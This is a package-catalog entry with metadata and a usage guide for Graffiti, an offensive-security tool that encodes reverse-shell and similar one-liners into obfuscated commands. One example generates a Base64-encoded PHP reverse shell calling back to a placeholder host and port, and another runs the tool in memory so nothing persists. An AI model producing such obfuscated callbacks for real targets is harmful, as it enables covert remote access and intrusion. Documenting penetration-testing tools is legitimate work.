---
name: "graffiti"
categories:
  - blackarch-misc
version: "24.4af61b4"
homepage: "https://github.com/Ekultek/Graffiti"
packaged-by: [blackarch]
blackarch-builddate: "2019-05-25"
build-system: scripts
license: custom:unknown
meta-checked: "2026-11-09"
github-repo: "Ekultek/Graffiti"
github-stars: 180
github-pushed: "2019-01-29"
github-archived: false
github-issues: 4
github-match: "exact"
gh-checked: "2026-11-07"
worth: 2.6
worth-basis: "full (activity+popularity+recency+adoption)"
worth-checked: "2026-11-09"
github-commits-year: 0
gh-activity-checked: "2026-11-09"
---

# graffiti

> Generate obfuscated one-liner payloads (Python, Perl, PHP, Bash, PowerShell, Batch) from a built-in payload database.

## What it's for

Graffiti encodes penetration-testing one-liners — reverse shells and similar snippets — with XOR, Base64, Hex, ROT13 or raw encoders, emitting a ready-to-paste command in the target language's syntax. It ships a database of payload definitions, caches every payload it generates so you can reuse them later, and can store your own payload definitions as JSON files. Launched with no arguments it drops into an interactive terminal with tab completion and history; launched with flags it encodes a payload and prints it immediately. It is a payload encoder and organizer, not a delivery framework — it prints the one-liner; getting it onto the target is up to you.

## Typical use cases

### Encode a payload as an obfuscated one-liner

Pick a payload from the database, fill in the callback address and port, and print the encoded command.

```
graffiti -c base64 -p /linux/php/socket_reverse.json -lH 198.51.100.10 -lP 4444
```

Outcome: prints the chosen payload as a single encoded line (here a `php -r 'exec(base64_decode("..."));'` command) ready to paste on the target, and stores it in the payload database.

### Drop into the interactive terminal

Start Graffiti without flags to browse, search, and encode payloads interactively.

```
graffiti
```

Outcome: opens the Graffiti terminal where `list` shows payloads, `search <phrase>` filters them, `use <payload> <coder>` encodes one, and `cached` re-shows previously generated payloads.

### List available payload definitions

See every payload path Graffiti knows about before choosing one.

```
graffiti -l
```

Outcome: prints all payload definition paths grouped by OS and language (for example `/linux/php/socket_reverse.json`).

### Run with an in-memory database

Keep generated payloads and history out of any on-disk database file so nothing persists after exit.

```
graffiti --memory
```

Outcome: Graffiti starts with its database held in RAM only; payload cache and history disappear when the session ends.

*No corpus evidence — derived from upstream documentation.*
